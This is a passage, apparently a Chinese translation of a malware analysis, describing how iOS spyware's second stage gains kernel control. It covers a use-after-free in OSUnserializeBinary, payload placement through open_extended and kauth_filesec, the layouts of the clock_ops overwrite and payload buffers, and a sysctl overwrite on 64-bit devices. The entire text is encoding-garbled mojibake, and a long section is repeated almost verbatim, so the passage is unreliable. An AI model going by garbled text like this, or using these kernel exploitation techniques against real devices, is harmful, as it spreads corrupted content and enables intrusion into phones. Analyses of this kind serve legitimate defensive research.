freeï¼‰æ¼æ´ã€‚å½“é—´æ¥å¼•ç”¨çš„å†…å­˜åŒºåŸŸï¼ˆæ¼æ´æƒ³è¦æ§åˆ¶çš„ï¼‰åœ¨æ¼æ´åˆ©ç”¨å¼€å§‹å‰åˆ†é…ç»™äº†å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ—¶ç«äº‰çŠ¶å†µäº§ç”Ÿäº†ã€‚å…¶ä»–çº¿ç¨‹å¯èƒ½çªç„¶ç”³è¯·ä¸€æ®µé‡è¦çš„å·²é‡Šæ”¾åŒºåŸŸï¼Œä¸ºé™ä½è¿™ç§å¯èƒ½æ€§ï¼Œé˜¶æ®µäºŒä¼šåˆ›å»ºéå¸¸å¤šçš„çº¿ç¨‹ï¼Œå¹¶ç«‹åˆ»å°†æ¯ä¸ªçº¿ç¨‹ï¼ˆä¸»çº¿ç¨‹ä¹‹å¤–çš„ï¼‰æš‚åœã€‚æ¥ç€ï¼Œé˜¶æ®µäºŒä¸ºä¸»çº¿ç¨‹ä¿®æ”¹æ—¶åˆ»è¡¨ç­–ç•¥ï¼Œä½¿åˆ©ç”¨UAFæ—¶ä¸ä¼šç¢°åˆ°å†…å­˜ç«äº‰å ç”¨çš„æƒ…å†µçš„å¯èƒ½æ€§å¤§å¤§å¢åŠ ã€‚ é˜¶æ®µäºŒ64ä½ç‰ˆæœ¬ä¸­è¿˜æœ‰é¢å¤–çš„ä¸€ä¸ªæ­¥éª¤ã€‚åœ¨çº¿ç¨‹æ—¶åˆ»è¡¨ä¿®æ”¹å®Œæˆåï¼Œé˜¶æ®µäºŒä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½å«æœ‰ä¸€ä¸ªå•ç´§ç¯ï¼Œè¿™ä¸ªå¾ªç¯ç­‰å¾…å…¨å±€å˜é‡é™è‡³é¢„å®šä¹‰å€¼ä»¥ä¸‹ï¼ˆå€¼å°äº0ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿ï¼ˆè‡³å°‘ï¼Œå¢åŠ å¯èƒ½æ€§ï¼‰æ²¡æœ‰å…¶ä»–çš„çº¿ç¨‹ä¼šäº‰å¤ºUFAç›®æ ‡å†…å­˜å—ã€‚ å»ºç«‹é€šä¿¡éš§é“ï¼ˆ32ä½ï¼‰é˜¶æ®µäºŒ32åŒ…åˆ©ç”¨pipeå‘½ä»¤åˆ›å»ºå¦ä¸€ä¸ªpipeï¼Œé‡æ–°ä½¿ç”¨åŸå…ˆç”Ÿæˆçš„pipeçš„å˜é‡ã€‚åœ¨è°ƒç”¨host_get_clock_serviceä¹‹åï¼Œè¿™ä¸ªå‘½ä»¤ç«‹åˆ»æ‰§è¡Œï¼Œä»¥è·å¾—å®æ—¶å’Œç”µæ± æ—¶é’Ÿã€‚å› è¿™ä¸ªpipeï¼Œhost_get_clock_serviceå†ä½¿ç”¨äº†ä¹‹å‰ä¸ºè·å¾—ä¸åŒæ—¶é’Ÿç«¯å£host_get_clock_serviceä½¿ç”¨çš„å˜é‡ã€‚ å…ˆå‰ç”Ÿæˆçš„pipeå’Œæ—¶é’Ÿç«¯å£éå¸¸å…³é”®ï¼Œå› ä¸ºæ¥ä¸‹æ¥çš„å†…æ ¸æ“ä½œä¼šç”¨åˆ°ï¼Œå¦‚æœå†…æ ¸ä»»åŠ¡ç«¯å£æ—©å·²å¯å¾—ï¼Œ32Stage2ä¼šç•¥è¿‡è¿™ä¸ªå¯¹ä¿®æ”¹å†…æ ¸å¾ˆé‡è¦çš„è¿‡ç¨‹è€Œæ˜¯ç›´æ¥è°ƒç”¨vm_writeæ¥ä¿®æ”¹å†…æ ¸ã€‚ç„¶è€Œï¼Œå¦‚æœ32Stage2æ²¡æœ‰å¾—åˆ°å†…æ ¸ä»»åŠ¡ç«¯å£ï¼ˆæ‰‹æœºæ²¡æœ‰è¶Šç‹±çš„æƒ…å†µï¼‰ï¼Œæ¼æ´åˆ©ç”¨å°±å¾ˆé‡è¦ã€‚ä½œä¸ºæ”»å‡»çš„ä¸€éƒ¨åˆ†ï¼Œ32Stage2åœ¨æ”»å‡»å‰å‘è¦è·å¾—pipeç»„å’Œæ—¶é’Ÿï¼Œå› æ­¤äºŒè¿›åˆ¶åŒ…å¯ä»¥ç¡®ä¿è·å¾—ã€‚å°½ç®¡æ²¡å¿…è¦é‡å¤ï¼Œè¿™æ˜¯ä¸ºç¡®ä¿é‡è¦çš„å¯¹è±¡å¯è¾¾ã€‚ å‡å®šç”¨äºæœ€ç»ˆè°ƒç”¨å‡½æ•°çš„è§¦å‘æœºåˆ¶åªä¸è¿‡æ˜¯å°†ç°æœ‰å‡½æ•°æŒ‡é’ˆé‡å®šå‘åˆ°sysctlå¤„ç†ç¨‹åºï¼Œ64ä½åŒ…ä¸ç”¨æ‰§è¡Œè¿™ä¸€æ­¥éª¤ã€‚ payloadæ„é€ å’Œå†…æ ¸æ’å…¥å¦‚æœä¸èƒ½é€šè¿‡å†…æ ¸ç«¯å£ä¿®æ”¹å†…æ ¸å­˜å‚¨ç©ºé—´ï¼Œ32Stage2å¿…é¡»åˆ©ç”¨iOSå·²å­˜æ¼æ´å»æ§åˆ¶å†…æ ¸ã€‚å…¶æ„é€ äº†ä¸¤ä¸ªæ•°æ®ç¼“å†²å—ï¼šåŒ…å«ä¿®æ”¹å®æ—¶å’Œç”µæ± æ—¶é’Ÿçš„20å­—èŠ‚çš„å…³é”®è¦†ç›–æ•°æ®å’Œ38å­—èŠ‚çš„ä¸€æ®µpayloadï¼Œä¼šè¿è¡Œä¸€ç³»åˆ—å°ç¨‹åºæ¥å®‰è£…æ—¶é’Ÿè¦†ç›–ç¨‹åºã€‚å¦‚ä¸‹ï¼šclock_ops_overwrite ç¼“å­˜åŒºï¼š [00] (rtclock.getattr):address of OSSerializer::serialize [04] (calend_config):NULL [08] (calend_init):NULL [0C] (calend_gettime):address of calen_gatattr [10] (calend_getattr):address of _bufattr_cpx uaf_payload_bufferæ”»å‡»åˆ©ç”¨çš„ç¼“å­˜åŒºï¼š [00] ptr to clock_ops_overwrite buffer [04] address of clock_ops array in kern memory [08] address of _copyin [0C] NULL [10] address of OSSerializer::serialize [14] address of &quot;BX LR&quot; code fragment [18] NULL [1C] address of OSSymbol::getMetaClass [20] address of &quot;BX LR&quot; code fragment [24] address of &quot;BX LR&quot; code fragment 32Stage2åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹æ¥å¤„ç†å®‰è£…ä¸€æ–°çš„æ—¶é’Ÿå¤„ç†ç¨‹åºæ‰€éœ€è¦çš„åˆå§‹æ“ä½œï¼Œä½†è¿™ä¸ªæ–°çº¿ç¨‹ä¸ä¼šè¿›è¡Œå®‰è£…ã€‚è¿™ä¸ªçº¿ç¨‹åœ¨æ ˆä¸Šåˆ›å»ºkauth_filesecæ•°æ®å—ï¼š .fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D .fsec.owner=&lt;undetermind, random stack value&gt;; .fsec.group=&lt;undetermind, random stack value&gt;; .fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1 uaf_payload_bufferæ·»åŠ åˆ°kauth _filesecä¸­çš„kauth_filesec.fsec_acl.acl_ace[]æ•°ç»„æœ«å°¾å¤„ã€‚è¿™ä¸ªä¼šåœ¨IOKitä¸Šå¼€è®¾ä¸€ä¸ªç«¯å£ï¼Œä¸ºAppleKeyStoreè°ƒç”¨IOServiceGetMatchingServiceã€‚è¯¥çº¿ç¨‹åˆ©ç”¨ä¸è·å–å†…æ ¸åœ°å€ç›¸åŒçš„æ–¹æ³•ï¼Œè·å¾—ä¸€æ®µæœ‰æ•ˆçš„å†…æ ¸å†…å­˜ç©ºé—´ã€‚æ–°çº¿ç¨‹å’Œä¹‹å‰ç›¸åŒæ“ä½œä¸åŒä¹‹å¤„åœ¨äºå±æ€§åç§°ä¸åŒï¼ˆæ–°çº¿ç¨‹ä½¿ç”¨â€œarararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararaâ€ï¼‰ã€‚ æ¥ç€ï¼Œopen_extended è°ƒç”¨syscallã€‚32åŒ…å°†é”å®šæ–‡ä»¶çš„åœ°å€ä¼ åˆ°syscallï¼Œè¿˜æœ‰KAUTH_UID_NONEå’ŒKAUTH_GID_NONEä¸¤ä¸ªå‚æ•°å€¼ï¼Œåœ¨çº¿ç¨‹å¼€å§‹æ—¶ï¼Œåˆ›å»ºkauth_filesecã€‚open_extendedä¼šæ‰§è¡Œä¸‹åˆ—ä»£ç ï¼š if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp; ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0)) kauth_copyinfilesecä»ç”¨æˆ·å—ä¸­å¤åˆ¶kauth_filesec åˆ°å†…æ ¸å—ä¸­çš„kauth_filesec æ•°æ®å—ä¸­ã€‚kauth_filesec åˆ¶ä½œäº†ä¸€ä¸ªè®¿é—®æ§åˆ¶åˆ—è¡¨(acl)åŒ…å«è®¿é—®æ§åˆ¶å…¥å£(ace)ã€‚å¦‚ä¸‹ï¼š /* FILE SECURITY information */ struct kauth_filesec{ u_int32_t fsec_magic; guid_t fsec_owner; guid_t fsec_group; struct kauth_acl fsec_acl; }ï¼› ACLå‚¨å­˜åœ¨kauth_acl ï¼Œå¦‚ä¸‹ï¼š /* Access Contro List */ struct kauth_acl{ u_int32_t acl_entrycount; u_int32_t acl_flags; struct kauth_ace acl_ace[1]; }; kauth_aceæœ‰24å­—èŠ‚ï¼Œå¦‚ä¸‹ï¼š typedef u_int32_t kauth_ace_rights_t; /* Access Control List Entry (ACE) */ struct kauth_ace{ guid_t ace_applicable; u_int32_t ace_flags; kauth_ace_rights_t ace_rights; /*scope specific*/ }; kauth_aclé‡Œçš„acl_entrycountæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´å‹ï¼Œå®šä¹‰äº†acl_aceæ•°ç»„é‡Œæœ‰å¤šå°‘ä¸ªkauth_aceå…¥å£ã€‚å¦‚æœACLé‡Œæ²¡æœ‰ACEè®°å½•ï¼Œacl_entrycountä¼šå®šä¹‰ä¸ºKAUTH_FILESEC_NOACLï¼Œè¿™ä¸ªå€¼ä¸º-1ã€‚åœ¨kauth_copyinfilesecä¸­å‘ç°å¦‚ä¸‹æ³¨é‡Šã€‚ /* çŒœæµ‹filesecçš„å¤§å°ã€‚ä»åŸºæŒ‡é’ˆå¼€å§‹ï¼Œ çœ‹çœ‹è¿˜æœ‰é¡µé¢ä¸Šè¿˜æœ‰å¤šå°‘ç©ºé—´å‰©ä½™ï¼Œ è£å‰ªåˆ°åˆç†çš„ä¸Šç•Œã€‚å¦‚æœç©ºé—´ä¸å¤Ÿï¼Œ é‡æ–°åŸºäºå®é™…ACLç©ºé—´å¤§å°å®šä¹‰ï¼Œé‡æ–°å¼€å§‹ã€‚ ä¸Šå±Šå€¼å¿…é¡»å°äºKAUTH_ACL_MAX_ENTRIESã€‚ ä½†å¯ä»»æ„å–å€¼ï¼Œ0ä¹Ÿå¯ä»¥ã€‚ */ å½“è¯¥çº¿ç¨‹æ„å»ºäº†kauth_filesecï¼Œä¼šç›´æ¥æ“æ§æ ˆä¸Šçš„æ•°æ®å—åœ°å€ï¼Œå¦‚ä¸‹ï¼š //get stack address p=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000; //kauth_filesec.fsec_magic (p+0xEC0)=0x12CC16D; //kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL (p+0xEE4)=-1; //kauth_filesec.fsec_acl.acl_ace[...] memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128); å †æ ˆåœ¨æ–°çº¿ç¨‹æ‰§è¡Œå¼€å§‹æ—¶å†…å®¹å¦‚ä¸‹ï¼š char stackAnchor; //[sp+101Fh] [bp-2031h]@1 unsigned int size; //[sp+2020h] [bp-2013h]@12 char buffer[4096]; //[sp+2024h] [bp-102h]@12 int v26; //[sp+3024h] [bp-2Ch]@7 mach_port_t connection; //[sp+3028h] [hp-28h]@4 kern_return_t result; //[sp+320Ch] [bp-24h]@4 mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST è¯¥æ–°çº¿ç¨‹åˆ©ç”¨stackAnchorå˜é‡æ‰¾åˆ°æ ˆçš„ä¸€ä¸ªé¡µè¾¹ç•Œå€¼ã€‚æ¥ç€ï¼Œçº¿ç¨‹åˆ›å»ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œç¡®ä¿è‡³å°‘æ ˆä¸Šçš„ä¸€é¡µç©ºé—´ä¸ä¼šåˆ†é…ç»™å‡½æ•°å…³é”®å˜é‡ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªkauth_filesecç»“æ„å—ï¼Œå…¶åŒ…å«äº†æ¯”å¿…éœ€çš„æ›´å¤šçš„ä¿¡æ¯ã€‚é€šè¿‡è®¾ç½®acl_entrycountå»å‘ç³»ç»Ÿè¯´æ˜æ²¡æœ‰ACEé¡¹ï¼Œåˆ™å½“open_extended åŠ è½½kauth_filesecæ—¶ï¼Œå…¶ä¸ä¼šè§£æacl _ flags ä»¥å¤–çš„ä»»ä½•æ•°ç»„ã€‚å› æ­¤ä¿æŠ¤äº†æ”»å‡»ç¼“å†²åŒºçš„å®Œæ•´æ€§ï¼Œå¹¶é˜²æ­¢å› æ”»å‡»ç¼“å†²åŒºä½œä¸ºä¸€çœŸçš„ACEä¼šè¢«ä¸­æ–­ï¼Œå†…æ ¸å¯èƒ½å› æ­¤äº§ç”Ÿé”™è¯¯ã€‚æœ€ç»ˆopen_extendedä¼šå°†æ”»å‡»ç¼“å†²åŒºï¼ˆä»¥åŠclock _ ops _ overwrite ç¼“å†²åŒºï¼‰çš„å†…å®¹å¤åˆ¶åˆ°å†…æ ¸åŒºåŸŸä¸­ã€‚ æ–°çº¿ç¨‹åˆ©ç”¨open_extended çš„æ¼æ´å°†æœªä¿®æ”¹çš„payloadæ”¾åˆ°äº†å†…æ ¸ä¸­ã€‚åˆ©ç”¨å…ˆå‰è®¨è®ºçš„æ¼æ´ï¼Œå³å…è®¸å†…æ ¸æ•°æ®æ³„éœ²è¿›ç”¨æˆ·å†…å­˜ä¸­ï¼Œå°±å¯ä»¥æ‰¾åˆ°payloadçš„åœ°å€ã€‚å½“å®Œæˆäº†å¯¹AppleKeyStoreæ¼æ´çš„æ”»å‡»ï¼Œbuffer å˜é‡ä¼ å‘io_service_open_extended ï¼ˆä½äºstackAnchoré™„è¿‘çš„ç›¸åŒå˜é‡ï¼‰ã€‚è¿™æ„å‘³ç€AppleKeyStore ä¼šè¿”å›æŒ‡å‘å†…æ ¸å—çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘open_extended å¤åˆ¶è¿›å†…æ ¸çš„ä»£ç å—çš„åä¸€é¡¹ã€‚å› æ­¤ï¼Œæ–°çº¿ç¨‹çš„ç›®çš„ä¸æ˜¯é‡å†™æ—¶é’Ÿå¤„ç†ç¨‹åºæŒ‡é’ˆï¼Œè€Œæ˜¯ä¸ºè¿™æ ·çš„æ”»å‡»åšå‡†å¤‡ã€‚ ä¸€æ—¦æ–°çº¿ç¨‹å®Œæˆå·¥ä½œï¼ŒåŒ…å«äº†æ”»å‡»ç¼“å†²åŒºåœ°å€çš„å˜é‡ä¼šè¢«æ£€æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦çœŸæ˜¯æ–°çº¿ç¨‹è®¾å®šçš„ï¼ˆåœ¨è°ƒç”¨æ–°çº¿ç¨‹å‰ï¼Œè¯¥å˜é‡å·²è¢«åˆå§‹åŒ–ä¸º0x12345678ï¼‰ã€‚å¦‚æœæ²¡æœ‰è·å¾—å†…æ ¸åœ°å€ï¼Œæ”»å‡»ä¾¿ä¼šåœæ­¢ã€‚ åœ¨æ–°çº¿ç¨‹æ´»åŠ¨å®Œæˆåï¼Œè‹¥æ‰‹æœºæ˜¯iPhone4.1ï¼ˆiPhone4sï¼‰ï¼Œä¸»çº¿ç¨‹ä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç”Ÿæˆä¸€ä¸ªå°å¾ªç¯ï¼Œå¾ªç¯ç­‰å¾…ä¸€å…¨å±€å˜é‡é™ä¸º0ä»¥ä¸‹ï¼ˆåˆ›å»ºæ˜¯é»˜è®¤å€¼ä¸º1000ï¼‰ã€‚å¹¶ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹iPhone4sä¼šæœ‰è¿™ç§è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºçš„ç»“æœä¼¼ä¹å¯¹æ‰€æœ‰å¹³å°éƒ½æœ‰ä»·å€¼ã€‚ä¸»çº¿ç¨‹å¤§é‡æ¶ˆè€—å†…å­˜èµ„æºï¼Œä»è€Œåœ¨UAFå¼€å‘æœŸé—´ï¼Œå‡å°‘äº†å¦ä¸€ä¸ªçº¿ç¨‹å°†äº§ç”Ÿå¹¶å› æ­¤äº‰å¤ºå†…å­˜èµ„æºçš„æ¦‚ç‡ã€‚ payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰è€ƒè™‘åˆ°64Stage2ä¸­ä½¿ç”¨çš„è§¦å‘æœºåˆ¶çš„ä¸åŒï¼Œè®¾ç½®å’Œpayloadç»“æ„ä¹Ÿæœ‰ç‚¹ä¸åŒçš„ã€‚64ä½æ²¡æœ‰åˆ›å»ºç®¡é“å’Œè¦†ç›–æ—¶é’Ÿgetattrè¯­å¥ï¼Œè€Œæ˜¯é‡å†™äº†ä¸€sysctl å¤„ç†å‡½æ•°ï¼Œæœ€ç»ˆä¹Ÿä¼šå¯¼è‡´ OSSerializer::serializeä»¥32ä½ç›¸ä¼¼æ–¹å¼æ‰§è¡Œã€‚ä¸ºå»ºç«‹æ‰§è¡ŒåŸè¯­ï¼Œ64ä½ç”¨åˆ°äº†net.inet.ip.dummynet.extract_heapçš„æ¥å£ï¼Œ64ä½å¯å‘å…¶ä¼ é€ä¸€ç²¾å¿ƒåˆ¶ä½œçš„æ•°æ®å—ï¼Œè¯¥æ•°æ®å—å…è®¸è¯¥äºŒè¿›åˆ¶åŒ…é‡å†™æŒ‡å‘è¿æ¥å†…æ ¸åŒºåŸŸçš„å˜é‡çš„æŒ‡é’ˆã€‚æœ€ç»ˆç»“æœå’Œgetattrå·®ä¸å¤šï¼Œå³å…è®¸64Stage2äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„å†…æ ¸ä¸­çš„ä»»æ„ROPé“¾ä»£ç ã€‚ å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰åˆ©ç”¨ç°åœ¨å†…æ ¸å†…å­˜ä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œ32Stage2å¿…é¡»æ¿€æ´»ä»£ç æ‰èƒ½å®‰è£…æ–°çš„clock_opså¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä½¿ç”¨æˆ·å¯ä»¥è®¿é—®å†…æ ¸å†…å­˜ã€‚32Stage2åœ¨io_service_open_extendedååºåˆ—åŒ–ä¾‹ç¨‹ä¸­ä½¿ç”¨äº†free-after-freeï¼ˆUAFï¼‰æ¼æ´ã€‚è™½ç„¶æŠ¥å‘Šå…ˆå‰å±•ç¤ºäº†io_service_open_extendedçš„ååºåˆ—åŒ–åŠŸèƒ½ä¼šæ³„æ¼å†…æ ¸åœ°å€ä¿¡æ¯ï¼Œä½†åŒä¸€ç»„ä»¶ä¸­çš„å¦ä¸€ä¸ªæ¼æ´ä¹Ÿå¯ä¼šé€ æˆåœ¨å†…æ ¸ä¸­å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚å½“io_service_open_extendedä¼ é€’å±æ€§æ•°æ®blobæ—¶ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeXMLä¹‹å‰å°†å†…å®¹ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´ã€‚ å¦‚æœkOSSerializeBinarySignatureå€¼å‡ºç°åœ¨æ•°æ®blobçš„å¼€å¤´ï¼ŒOSUnserializeXMLæŒ‰é¡ºåºå°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeBinaryã€‚OSUnserializeBinaryå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ propertieså‚æ•°ä¸­çš„æ•°æ®blobè¡¨ç¤ºä¸€å·²åºåˆ—åŒ–çš„XMLå­—å…¸ï¼ˆæˆ–å®¹å™¨ï¼‰ã€‚ä¸ºäº†é‡æ„å…³ç³»ï¼ŒOSUnserializeBinaryéå†æ•´ä¸ªblobæ•°æ®æ¥è§£æå‡ºå„ä¸ªæ•°æ®å¯¹è±¡ã€‚åœ¨ç¼–ç è¿‡ç¨‹ä¸­ï¼ˆå°†åŸå§‹XMLè½¬æ¢ä¸ºå…¶äºŒè¿›åˆ¶è¡¨ç¤ºçš„è¿‡ç¨‹ï¼‰å¯èƒ½ä¼šé‡å¤å‘ç°ç›¸åŒçš„å¯¹è±¡ã€‚ä¸ºäº†æ›´æœ‰æ•ˆåœ°å¤„ç†é‡å¤æ•°æ®ï¼Œå°†é‡å¤å¯¹è±¡å­˜å‚¨åœ¨æ•°ç»„ï¼ˆobjsArrayï¼‰ä¸­ï¼Œé‡æ„çš„XMLå­—å…¸ä¸­çš„å¯¹è±¡å°±å¯ä»¥ç”±æ•°ç»„çš„ç´¢å¼•æ¥è¡¨ç¤ºã€‚ åœ¨OSUnserializeBinaryä¸­ï¼Œwhileå¾ªç¯éå†blobä¸­çš„æ¯ä¸ªå·²ç¼–ç å¯¹è±¡ã€‚å¾ªç¯é¦–å…ˆç¡®å®šå¯¹è±¡çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒkOS Serialize Dictionaryï¼ŒkOS SerializeArrayï¼ŒkOSSerializeNumberï¼Œç­‰ç­‰ï¼‰åŠå…¶å¤§å°ã€‚ len = (key &amp; kOSSerializeDataMask); ... switch ( kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeArray: o = newArray =OSArray::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len!=0); case kOSSerializeObject; if(len&gt;=objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; } å †æ ˆåœ¨æ–°çº¿ç¨‹æ‰§è¡Œå¼€å§‹æ—¶å†…å®¹å¦‚ä¸‹ï¼š char stackAnchor; //[sp+101Fh] [bp-2031h]@1 unsigned int size; //[sp+2020h] [bp-2013h]@12 char buffer[4096]; //[sp+2024h] [bp-102h]@12 int v26; //[sp+3024h] [bp-2Ch]@7 mach_port_t connection; //[sp+3028h] [hp-28h]@4 kern_return_t result; //[sp+320Ch] [bp-24h]@4 mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST è¯¥æ–°çº¿ç¨‹åˆ©ç”¨stackAnchorå˜é‡æ‰¾åˆ°æ ˆçš„ä¸€ä¸ªé¡µè¾¹ç•Œå€¼ã€‚æ¥ç€ï¼Œçº¿ç¨‹åˆ›å»ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œç¡®ä¿è‡³å°‘æ ˆä¸Šçš„ä¸€é¡µç©ºé—´ä¸ä¼šåˆ†é…ç»™å‡½æ•°å…³é”®å˜é‡ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªkauth_filesecç»“æ„å—ï¼Œå…¶åŒ…å«äº†æ¯”å¿…éœ€çš„æ›´å¤šçš„ä¿¡æ¯ã€‚é€šè¿‡è®¾ç½®acl_entrycountå»å‘ç³»ç»Ÿè¯´æ˜æ²¡æœ‰ACEé¡¹ï¼Œåˆ™å½“open_extended åŠ è½½kauth_filesecæ—¶ï¼Œå…¶ä¸ä¼šè§£æacl _ flags ä»¥å¤–çš„ä»»ä½•æ•°ç»„ã€‚å› æ­¤ä¿æŠ¤äº†æ”»å‡»ç¼“å†²åŒºçš„å®Œæ•´æ€§ï¼Œå¹¶é˜²æ­¢å› æ”»å‡»ç¼“å†²åŒºä½œä¸ºä¸€çœŸçš„ACEä¼šè¢«ä¸­æ–­ï¼Œå†…æ ¸å¯èƒ½å› æ­¤äº§ç”Ÿé”™è¯¯ã€‚æœ€ç»ˆopen_extendedä¼šå°†æ”»å‡»ç¼“å†²åŒºï¼ˆä»¥åŠclock _ ops _ overwrite ç¼“å†²åŒºï¼‰çš„å†…å®¹å¤åˆ¶åˆ°å†…æ ¸åŒºåŸŸä¸­ã€‚ æ–°çº¿ç¨‹åˆ©ç”¨open_extended çš„æ¼æ´å°†æœªä¿®æ”¹çš„payloadæ”¾åˆ°äº†å†…æ ¸ä¸­ã€‚åˆ©ç”¨å…ˆå‰è®¨è®ºçš„æ¼æ´ï¼Œå³å…è®¸å†…æ ¸æ•°æ®æ³„éœ²è¿›ç”¨æˆ·å†…å­˜ä¸­ï¼Œå°±å¯ä»¥æ‰¾åˆ°payloadçš„åœ°å€ã€‚å½“å®Œæˆäº†å¯¹AppleKeyStoreæ¼æ´çš„æ”»å‡»ï¼Œbuffer å˜é‡ä¼ å‘io_service_open_extended ï¼ˆä½äºstackAnchoré™„è¿‘çš„ç›¸åŒå˜é‡ï¼‰ã€‚è¿™æ„å‘³ç€AppleKeyStore ä¼šè¿”å›æŒ‡å‘å†…æ ¸å—çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘open_extended å¤åˆ¶è¿›å†…æ ¸çš„ä»£ç å—çš„åä¸€é¡¹ã€‚å› æ­¤ï¼Œæ–°çº¿ç¨‹çš„ç›®çš„ä¸æ˜¯é‡å†™æ—¶é’Ÿå¤„ç†ç¨‹åºæŒ‡é’ˆï¼Œè€Œæ˜¯ä¸ºè¿™æ ·çš„æ”»å‡»åšå‡†å¤‡ã€‚ ä¸€æ—¦æ–°çº¿ç¨‹å®Œæˆå·¥ä½œï¼ŒåŒ…å«äº†æ”»å‡»ç¼“å†²åŒºåœ°å€çš„å˜é‡ä¼šè¢«æ£€æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦çœŸæ˜¯æ–°çº¿ç¨‹è®¾å®šçš„ï¼ˆåœ¨è°ƒç”¨æ–°çº¿ç¨‹å‰ï¼Œè¯¥å˜é‡å·²è¢«åˆå§‹åŒ–ä¸º0x12345678ï¼‰ã€‚å¦‚æœæ²¡æœ‰è·å¾—å†…æ ¸åœ°å€ï¼Œæ”»å‡»ä¾¿ä¼šåœæ­¢ã€‚ åœ¨æ–°çº¿ç¨‹æ´»åŠ¨å®Œæˆåï¼Œè‹¥æ‰‹æœºæ˜¯iPhone4.1ï¼ˆiPhone4sï¼‰ï¼Œä¸»çº¿ç¨‹ä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç”Ÿæˆä¸€ä¸ªå°å¾ªç¯ï¼Œå¾ªç¯ç­‰å¾…ä¸€å…¨å±€å˜é‡é™ä¸º0ä»¥ä¸‹ï¼ˆåˆ›å»ºæ˜¯é»˜è®¤å€¼ä¸º1000ï¼‰ã€‚å¹¶ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹iPhone4sä¼šæœ‰è¿™ç§è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºçš„ç»“æœä¼¼ä¹å¯¹æ‰€æœ‰å¹³å°éƒ½æœ‰ä»·å€¼ã€‚ä¸»çº¿ç¨‹å¤§é‡æ¶ˆè€—å†…å­˜èµ„æºï¼Œä»è€Œåœ¨UAFå¼€å‘æœŸé—´ï¼Œå‡å°‘äº†å¦ä¸€ä¸ªçº¿ç¨‹å°†äº§ç”Ÿå¹¶å› æ­¤äº‰å¤ºå†…å­˜èµ„æºçš„æ¦‚ç‡ã€‚ payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰è€ƒè™‘åˆ°64Stage2ä¸­ä½¿ç”¨çš„è§¦å‘æœºåˆ¶çš„ä¸åŒï¼Œè®¾ç½®å’Œpayloadç»“æ„ä¹Ÿæœ‰ç‚¹ä¸åŒçš„ã€‚64ä½æ²¡æœ‰åˆ›å»ºç®¡é“å’Œè¦†ç›–æ—¶é’Ÿgetattrè¯­å¥ï¼Œè€Œæ˜¯é‡å†™äº†ä¸€sysctl å¤„ç†å‡½æ•°ï¼Œæœ€ç»ˆä¹Ÿä¼šå¯¼è‡´ OSSerializer::serializeä»¥32ä½ç›¸ä¼¼æ–¹å¼æ‰§è¡Œã€‚ä¸ºå»ºç«‹æ‰§è¡ŒåŸè¯­ï¼Œ64ä½ç”¨åˆ°äº†net.inet.ip.dummynet.extract_heapçš„æ¥å£ï¼Œ64ä½å¯å‘å…¶ä¼ é€ä¸€ç²¾å¿ƒåˆ¶ä½œçš„æ•°æ®å—ï¼Œè¯¥æ•°æ®å—å…è®¸è¯¥äºŒè¿›åˆ¶åŒ…é‡å†™æŒ‡å‘è¿æ¥å†…æ ¸åŒºåŸŸçš„å˜é‡çš„æŒ‡é’ˆã€‚æœ€ç»ˆç»“æœå’Œgetattrå·®ä¸å¤šï¼Œå³å…è®¸64Stage2äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„å†…æ 